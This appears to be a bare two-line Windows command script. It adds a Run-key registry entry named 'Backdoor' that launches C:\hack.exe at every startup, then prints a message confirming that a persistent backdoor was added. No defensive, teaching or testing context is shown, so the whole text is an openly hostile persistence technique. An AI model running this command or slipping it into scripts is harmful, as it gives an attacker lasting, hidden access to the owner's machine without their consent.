reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v 'Backdoor' /t REG_SZ /d 'C:\hack.exe' /f
Write-Output 'Persistent registry backdoor added'
